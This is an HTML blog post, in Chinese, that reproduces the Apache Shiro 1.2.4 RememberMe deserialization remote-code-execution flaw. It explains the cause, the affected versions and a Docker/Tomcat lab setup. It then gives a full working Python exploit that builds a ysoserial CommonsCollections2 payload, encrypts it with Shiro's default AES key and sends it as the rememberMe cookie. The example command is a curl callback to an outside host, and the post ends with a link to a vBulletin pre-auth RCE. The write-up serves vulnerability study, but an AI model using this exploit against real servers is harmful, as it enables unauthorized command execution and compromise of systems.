@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>apache shiro rememberme 1.2.4 反序列化rce复现 | Damit5&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+    <meta name="keywords" content="damit5" />
+  
+  
+  
+  
+  <meta name="description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer0&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;Mine&quot;, 					author: &quot;Taylor Swift&quot;, 					url: &quot;/">
+<meta name="keywords" content="漏洞复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Shiro RememberMe 1.2.4 反序列化RCE复现">
+<meta property="og:url" content="https://damit5.com/2019/09/26/Apache-Shiro-RememberMe-1-2-4-反序列化RCE复现/index.html">
+<meta property="og:site_name" content="Damit5&#39;s Blog">
+<meta property="og:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer0&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;Mine&quot;, 					author: &quot;Taylor Swift&quot;, 					url: &quot;/">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://raw.githubusercontent.com/damit5/GraphBed/master/image/1569486090733258711.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/damit5/GraphBed/master/image/156948647749321562725.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/damit5/GraphBed/master/image/15694867415237185637.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/damit5/GraphBed/master/image/156948805211953621505.jpg">
+<meta property="og:updated_time" content="2019-09-26T09:27:07.771Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Apache Shiro RememberMe 1.2.4 反序列化RCE复现">
+<meta name="twitter:description" content="new APlayer({ 				element: document.getElementById(&quot;aplayer0&quot;), 				narrow: false, 				autoplay: true, 				showlrc: 0, 				music: { 					title: &quot;Mine&quot;, 					author: &quot;Taylor Swift&quot;, 					url: &quot;/">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/damit5/GraphBed/master/image/1569486090733258711.jpg">
+  
+    <link rel="alternate" href="/atom.xml" title="Damit5&#39;s Blog" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/favicon.png">
+  <link rel="apple-touch-icon" href="/css/images/favicon.png">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+  <script src="/js/bootstrap.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    <link rel="stylesheet" href="/css/dialog.css">
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/favicon.png">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/About">About</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/Link">link</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="index.search"><button type="submit" class="search-form-submit"> </button><input type="hidden" name="sitesearch" value="https://damit5.com"></form>
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-Apache-Shiro-RememberMe-1-2-4-反序列化RCE复现" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      Apache Shiro RememberMe 1.2.4 反序列化RCE复现
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2019/09/26/Apache-Shiro-RememberMe-1-2-4-反序列化RCE复现/" class="article-date">
+	  <time datetime="2019-09-26T09:24:43.000Z" itemprop="datePublished">2019-09-26</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <script src="/assets/js/APlayer.min.js"> </script><div id="aplayer0" class="aplayer" style="margin-bottom: 20px;"></div>
+		<script>
+			new APlayer({
+				element: document.getElementById("aplayer0"),
+				narrow: false,
+				autoplay: true,
+				showlrc: 0,
+				music: {
+					title: "Mine",
+					author: "Taylor Swift",
+					url: "/Music/233.mp3",
+					pic: "/Music/233.jpg",
+				}
+			});
+		</script>
+<h2 id="Apache-Shiro-简介"><a href="#Apache-Shiro-简介" class="headerlink" title="Apache Shiro 简介"></a>Apache Shiro 简介</h2><p>Apache Shiro 是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API,您可以快速、轻松地获得任何应用程序,从最小的移动应用程序到最大的网络和企业应用程序。</p>
+<a id="more"></a>
+<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache Shiro 反序列化漏洞的主要成因是 shiro 在进行 remember me 操作时，将用户信息序列化后加密存储在cookie中，当shiro 获取这个cookie进行反序列化操作获取原始用户信息时，没有严格限制反序列化内容，导致了命令执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Apache Shiro &lt;= 1.2.4</div></pre></td></tr></table></figure>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h4 id="1-下载tomcat的docker环境"><a href="#1-下载tomcat的docker环境" class="headerlink" title="1.下载tomcat的docker环境"></a>1.下载tomcat的docker环境</h4><p><img src="https://raw.githubusercontent.com/damit5/GraphBed/master/image/1569486090733258711.jpg" alt=""></p>
+<h4 id="2-下载samples-web-1-2-4-war包"><a href="#2-下载samples-web-1-2-4-war包" class="headerlink" title="2.下载samples-web-1.2.4.war包"></a>2.下载<code>samples-web-1.2.4.war</code>包</h4><p><a href="samples-web-1.2.4.war">点我点我</a></p>
+<h4 id="3-启动tomcat镜像并进入"><a href="#3-启动tomcat镜像并进入" class="headerlink" title="3.启动tomcat镜像并进入"></a>3.启动tomcat镜像并进入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 启动tomcat</div><div class="line">docker run --name tomcat -itd --privileged=true --rm -v /home/moonshy/Desktop/webapp:/usr/local/tomcat/webapps/webapp-p 80:8080 tomcat</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># docker参数解释</div><div class="line"></div><div class="line">--name tomcat 创建容器名称为tomcat</div><div class="line">--privileged=true 允许镜像挂载映射本地目录</div><div class="line">-p 80:8086使用本地380端口映射容器中的8080端口</div><div class="line">--rm 创建的容器在关闭后能够自动删除，不会影响数据</div><div class="line">-v /home/moonshy/Desktop/webapp:/usr/local/tomcat/webapps/webapp将本地/home/moonshy/Desktop/webapp目录映射挂载到容器中的/usr/local/tomcat/webapps/webapp目录</div><div class="line">-itd 以后台守护进程启动容器</div><div class="line">tomcat tomcat镜像名</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># 进入tomcat容器</div><div class="line"></div><div class="line">docker exec -it &lt;docker_tomcat_id&gt; /bin/bash</div></pre></td></tr></table></figure>
+<h4 id="4-将war包导入tomcat的webapp目录"><a href="#4-将war包导入tomcat的webapp目录" class="headerlink" title="4.将war包导入tomcat的webapp目录"></a>4.将<code>war</code>包导入<code>tomcat</code>的<code>webapp</code>目录</h4><blockquote>
+<p>war包导入后会自动解压</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/damit5/GraphBed/master/image/156948647749321562725.jpg" alt=""></p>
+<h4 id="5-查看是否搭建成功"><a href="#5-查看是否搭建成功" class="headerlink" title="5.查看是否搭建成功"></a>5.查看是否搭建成功</h4><blockquote>
+<p>可将 <code>samples-web-1.2.4</code> 修改为 <code>shiro</code>（好看）</p>
+</blockquote>
+<p>访问 <code>http://ip/shiro</code> 即可成功</p>
+<p><img src="https://raw.githubusercontent.com/damit5/GraphBed/master/image/15694867415237185637.jpg" alt=""></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a><a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar" target="_blank" rel="external"><code>ysoserial</code></a></h4><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">ysoserial项目地址</a></p>
+<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*- </span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line"><span class="string">pip install pycrypto</span></div><div class="line"><span class="string">from https://www.cnblogs.com/loong-hon/p/10619616.html</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">ysoserial</span></div><div class="line"><span class="string">CommonsCollections1 @frohoff                    commons-collections:3.1</span></div><div class="line"><span class="string">CommonsCollections2 @frohoff                    commons-collections4:4.0</span></div><div class="line"><span class="string">CommonsCollections3 @frohoff                    commons-collections:3.1</span></div><div class="line"><span class="string">CommonsCollections4 @frohoff                    commons-collections4:4.0</span></div><div class="line"><span class="string">CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1</span></div><div class="line"><span class="string">CommonsCollections6 @matthias_kaiser            commons-collections:3.1</span></div><div class="line"><span class="string">'''</span></div><div class="line"><span class="comment"># 可以是绝对路径 也可以是相对路径</span></div><div class="line">JAR_FILE = <span class="string">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, rce_command)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</div><div class="line">        target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        target = url</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        payload = generator(rce_command, JAR_FILE)  <span class="comment"># 生成payload</span></div><div class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># 发送验证请求</span></div><div class="line">        <span class="keyword">print</span> r.text</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">pass</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(command, fp)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</div><div class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</div><div class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'CommonsCollections2'</span>, command],</div><div class="line">                             stdout=subprocess.PIPE)</div><div class="line">    BS = AES.block_size</div><div class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</div><div class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></div><div class="line">    mode = AES.MODE_CBC</div><div class="line">    iv = uuid.uuid4().bytes</div><div class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</div><div class="line">    file_body = pad(popen.stdout.read())</div><div class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</div><div class="line">    <span class="keyword">return</span> base64_ciphertext</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment"># 传入目标站点和要执行的命令即可</span></div><div class="line">    poc(<span class="string">'http://ip:80/shiro'</span>, <span class="string">'curl http://ip:port'</span>)</div></pre></td></tr></table></figure>
+<blockquote>
+<p>然后一键就成功了</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/damit5/GraphBed/master/image/156948805211953621505.jpg" alt=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
+<p><a href="http://www.db-sec.com/2019/06/apache-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="external">http://www.db-sec.com/2019/06/apache-shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a href="http://www.xianxianlabs.com/2019/08/18/apache-shiro-rec/" target="_blank" rel="external">http://www.xianxianlabs.com/2019/08/18/apache-shiro-rec/</a></p>
+<p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="external">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p>
+<p><a href="https://github.com/Medicean/VulApps/tree/master/s/shiro/1" target="_blank" rel="external">https://github.com/Medicean/VulApps/tree/master/s/shiro/1</a></p>
+</blockquote>
+<h2 id="福利？"><a href="#福利？" class="headerlink" title="福利？"></a>福利？</h2><p><a href="https://github.com/ParrotSec-CN/HellScream/blob/master/CMS/vBulletin/vBulletin%205.x%20pre-auth%20RCE.md" target="_blank" rel="external">vBulletin 5.x pre-auth RCE</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/08/05/LDAP注入入门学习/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">LDAP注入入门学习</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Apache-Shiro-简介"><span class="nav-number">1.</span> <span class="nav-text">Apache Shiro 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞成因"><span class="nav-number">2.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响版本"><span class="nav-number">3.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">4.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-下载tomcat的docker环境"><span class="nav-number">4.0.1.</span> <span class="nav-text">1.下载tomcat的docker环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-下载samples-web-1-2-4-war包"><span class="nav-number">4.0.2.</span> <span class="nav-text">2.下载samples-web-1.2.4.war包</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-启动tomcat镜像并进入"><span class="nav-number">4.0.3.</span> <span class="nav-text">3.启动tomcat镜像并进入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-将war包导入tomcat的webapp目录"><span class="nav-number">4.0.4.</span> <span class="nav-text">4.将war包导入tomcat的webapp目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-查看是否搭建成功"><span class="nav-number">4.0.5.</span> <span class="nav-text">5.查看是否搭建成功</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ysoserial"><span class="nav-number">5.0.1.</span> <span class="nav-text">ysoserial</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POC"><span class="nav-number">5.0.2.</span> <span class="nav-text">POC</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">6.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#福利？"><span class="nav-number">7.</span> <span class="nav-text">福利？</span></a></li></ol>
+    
+    </div>
+  </aside>
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2017 - 2019 Damit5&#39;s Blog All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/About" class="mobile-nav-link">About</a>
+  
+    <a href="/Link" class="mobile-nav-link">Link</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+  <script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            Damit5&#39;s Blog
+          </div>
+          <div class="panel-body">
+            Copyright © 2019 Damit 5 All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
